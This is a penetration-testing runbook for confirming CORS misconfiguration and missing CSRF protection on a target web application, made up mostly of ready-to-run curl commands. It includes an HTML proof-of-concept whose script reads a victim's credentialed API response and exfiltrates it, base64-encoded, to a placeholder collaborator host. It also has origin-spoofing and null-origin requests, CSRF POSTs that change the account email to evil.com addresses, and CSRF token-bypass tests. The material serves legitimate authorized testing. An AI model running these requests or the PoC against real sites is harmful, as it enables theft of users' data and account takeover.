# CORS/CSRF — Runbook 03: Verify

## Purpose
Confirm with high confidence that CORS is exploitable or CSRF protection is absent. Produce reproducible evidence.

## Variables
- `$TARGET_URL` — base URL
- `$OUTDIR` — output directory
- `$COOKIE_JAR` — optional authenticated cookie jar
- `$EVIDENCE_DIR` — evidence output directory

---

## W3.1 — Verify origin reflection (CORS misconfig)

### Step 1: Single-origin test

```bash
TARGET_ENDPOINT="$TARGET_URL/api/me"

curl -v "$TARGET_ENDPOINT" \
  -H "Origin: https://evil.com" \
  ${COOKIE_JAR:+-b "$COOKIE_JAR"} \
  -o "$EVIDENCE_DIR/response-body.txt" \
  2>"$EVIDENCE_DIR/request-headers.txt"

grep -i 'access-control-allow-origin' "$EVIDENCE_DIR/request-headers.txt"
```

### Step 2: Verify response contains sensitive data

```bash
grep -ciE '(email|token|session|password|api_key|secret|credit|ssn|phone|address|role|admin)' "$EVIDENCE_DIR/response-body.txt"
```

### Step 3: Verify ACAC if present

```bash
grep -i 'access-control-allow-credentials' "$EVIDENCE_DIR/request-headers.txt"
```

### Step 4: Build PoC HTML

```bash
cat > "$EVIDENCE_DIR/poc.html" << 'POCEOF'
<html>
<body>
<h1>CORS PoC</h1>
<div id="result"></div>
<script>
fetch('TARGET_ENDPOINT_HERE', {
  credentials: 'include'
})
.then(r => r.text())
.then(d => {
  document.getElementById('result').innerText = d;
  fetch('https://YOUR-COLLABORATOR.oastify.com/?d=' + btoa(d));
});
</script>
</body>
</html>
POCEOF
```

---

## W3.2 — Verify subdomain takeover CORS

```bash
# Check if any *.target.com subdomain is available for registration
TARGET_HOST=$(echo "$TARGET_URL" | awk -F/ '{print $3}')

curl -s "https://$TARGET_HOST" \
  -H "Origin: https://evilcors.$TARGET_HOST" \
  -D - -o /dev/null 2>/dev/null \
  | grep -i 'access-control-allow-origin'

# Verify with multiple subdomain variants
for prefix in evil test staging dev api2; do
  acao=$(curl -s -D - -o /dev/null "https://$TARGET_HOST/api/me" \
    -H "Origin: https://$prefix.$TARGET_HOST" 2>/dev/null \
    | grep -i 'access-control-allow-origin')
  echo "$prefix.$TARGET_HOST -> $acao"
done >> "$EVIDENCE_DIR/subdomain-cors-verify.txt"
```

---

## W3.3 — Verify null origin bypass

```bash
curl -v "$TARGET_URL/api/me" \
  -H "Origin: null" \
  ${COOKIE_JAR:+-b "$COOKIE_JAR"} \
  -o "$EVIDENCE_DIR/null-origin-response.txt" \
  2>"$EVIDENCE_DIR/null-origin-headers.txt"

grep -i 'access-control-allow-origin' "$EVIDENCE_DIR/null-origin-headers.txt"
grep -i 'access-control-allow-credentials' "$EVIDENCE_DIR/null-origin-headers.txt"
```

## W3.4 — Verify CSRF (state-changing action without token)

```bash
CSRF_TARGET="$TARGET_URL/settings/email"

# Step 1: Get current state
curl -s "$CSRF_TARGET" ${COOKIE_JAR:+-b "$COOKIE_JAR"} \
  > "$EVIDENCE_DIR/pre-state.txt"

# Step 2: Send state-changing request without CSRF token
curl -v -X POST "$CSRF_TARGET" \
  ${COOKIE_JAR:+-b "$COOKIE_JAR"} \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Referer: $TARGET_URL/" \
  -d "email=csrf-test@evil.com" \
  -o "$EVIDENCE_DIR/csrf-post-response.txt" \
  2>"$EVIDENCE_DIR/csrf-post-headers.txt"

# Step 3: Verify state changed
curl -s "$CSRF_TARGET" ${COOKIE_JAR:+-b "$COOKIE_JAR"} \
  > "$EVIDENCE_DIR/post-state.txt"

diff "$EVIDENCE_DIR/pre-state.txt" "$EVIDENCE_DIR/post-state.txt"
```

## W3.5 — Verify CSRF token bypass methods

```bash
# Test with empty token
curl -s -X POST "$CSRF_TARGET" \
  ${COOKIE_JAR:+-b "$COOKIE_JAR"} \
  -d "csrf_token=&email=csrf-bypass@evil.com" \
  -D - -o /dev/null | head -1

# Test with token removed entirely
curl -s -X POST "$CSRF_TARGET" \
  ${COOKIE_JAR:+-b "$COOKIE_JAR"} \
  -d "email=csrf-no-token@evil.com" \
  -D - -o /dev/null | head -1

# Test GET instead of POST
curl -s "$CSRF_TARGET?email=csrf-get@evil.com" \
  ${COOKIE_JAR:+-b "$COOKIE_JAR"} \
  -D - -o /dev/null | head -1
```

---

## Stop Conditions — When to Cease

| Condition | Reason |
|---|---|
| ACAO never reflects any supplied origin | Properly implemented CORS |
| All CSRF attempts return 403/422 with token error | Token validation working |
| Preflight returns 4xx for cross-origin methods | Preflight enforcement correct |
| Response contains no sensitive user data even with ACAO reflection | Impact too low -- public endpoint |
| CORS reflection exists but ACAC is absent | Browser will not send cookies -- low risk |

---

## Next Routing

| Result | Route |
|---|---|
| CORS confirmed exploitable (origin reflected + credentials or sensitive data) | -> 04-impact-escalation.md |
| CSRF confirmed (state changed without token) | -> 04-impact-escalation.md |
| Unconfirmed but suspicious | -> 06-false-positive-filter.md |
| Verified safe -- all tests passed | -> 05-evidence-collection.md (document as negative finding) |

---

## Output Files

| File | Contents |
|---|---|
| $EVIDENCE_DIR/request-headers.txt | curl -v output including ACAO reflection |
| $EVIDENCE_DIR/response-body.txt | Full response body showing sensitive data |
| $EVIDENCE_DIR/poc.html | HTML PoC for CORS exploitation |
| $EVIDENCE_DIR/null-origin-headers.txt | Headers from null origin test |
| $EVIDENCE_DIR/null-origin-response.txt | Response body from null origin test |
| $EVIDENCE_DIR/pre-state.txt | Application state before CSRF test |
| $EVIDENCE_DIR/post-state.txt | Application state after CSRF test |
| $EVIDENCE_DIR/csrf-post-headers.txt | Headers from CSRF POST attempt |
| $EVIDENCE_DIR/csrf-post-response.txt | Body from CSRF POST attempt |
| $EVIDENCE_DIR/subdomain-cors-verify.txt | Subdomain CORS verification |
